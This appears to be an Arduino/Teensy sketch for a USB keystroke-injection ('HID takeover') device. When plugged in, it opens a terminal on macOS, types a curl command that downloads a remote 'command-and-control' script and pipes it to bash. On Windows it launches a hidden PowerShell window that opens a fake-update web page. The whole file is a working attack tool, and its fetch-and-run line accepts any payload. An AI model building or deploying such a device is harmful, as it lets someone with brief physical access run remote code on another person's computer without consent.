/*
 * $10 USB HID takover device alternative
 * Tested so far only on Mac with US keyboard and Czech driver (unusual combination).
 * Should work on US/US without issues.
 */

#include <Keyboard.h>

/*
 * HID SKETCHPAD (keep cursor here to stay on the safer side - well, not really)
 */
 
const int ledPin = 11;

void setup() {
  Serial.begin(9600);
  pinMode(ledPin, OUTPUT);
  digitalWrite(ledPin, LOW);
}

// Choose your target:
#define MACOSX
//#define WINDOWS

#ifdef MACOSX
String SHELL_SCRIPT1 = "curl -s https://raw.githubusercontent.com/corpus-solutions/sec-takover-examples/master/safe/mac/fake_update.sh ";
String SHELL_SCRIPT2 = " bash\n";
#endif

#ifdef WINDOWS
String SHELL_SCRIPT1 = "powershell -windowstyle hidden (new-object -com wscript.shell).run('http://fakeupdate.net/win10u/',3)";
#endif

void loop() {
  
  // Your computer will receive these characters from a USB keyboard.
  
  blink();
   
#ifdef MACOSX
  doMac();
#else if WINDOWS
  doWindows();
#endif

  // stop forever (TODO: blink Teensy LED)
  while (true) {
    delay(5000);
    blink();
  }
}

void blink() {
  digitalWrite(ledPin, HIGH);   // set the LED on
  delay(1000);                  // wait for a second
  digitalWrite(ledPin, LOW);    // set the LED off
}

void doMac() {
  pressAndReleaseAppleSpace(); 
  delay(1000); 
  
  Keyboard.print("Term");   
  delay(500);
  
  Keyboard.print("\n"); 
  delay(100);

  blink();

  // Pull command-and-control script
  Keyboard.print(SHELL_SCRIPT1);

  // Pipe (platform specific)
  pressAndReleasePipe();

  // ..to bash. Enter.
  Keyboard.println(SHELL_SCRIPT2);
}

void pressAndReleaseAppleSpace()
{
  // Press Apple (Windows) Key
  Keyboard.set_modifier(MODIFIERKEY_GUI);
  Keyboard.send_now();

  // Press Space
  Keyboard.set_key1(KEY_SPACE);
  Keyboard.send_now();

  // Release all the keys at the same instant
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
}

void pressAndReleaseAppleT()
{
  // Press Apple (Windows) Key
  Keyboard.set_modifier(MODIFIERKEY_GUI);
  Keyboard.send_now();

  // Press Space
  Keyboard.set_key1(KEY_T);
  Keyboard.send_now();

  // Release all the keys at the same instant
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
}

void pressAndReleasePipe()
{
  // Press Apple (Windows) Key
  Keyboard.set_modifier(MODIFIERKEY_SHIFT);
  Keyboard.send_now();

  // Press Space
  Keyboard.set_key1(KEY_TILDE);
  Keyboard.send_now();

  // Release all the keys at the same instant
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
}

void doWindows() {
  pressAndReleaseWindowsR();
  delay(1000);
  Keyboard.print(SHELL_SCRIPT1);
}

void pressAndReleaseWindowsR()
{
  // Press Apple (Windows) Key
  Keyboard.set_modifier(MODIFIERKEY_GUI);
  Keyboard.send_now();

  // Press Space
  Keyboard.set_key1(KEY_R);
  Keyboard.send_now();

  // Release all the keys at the same instant
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
}
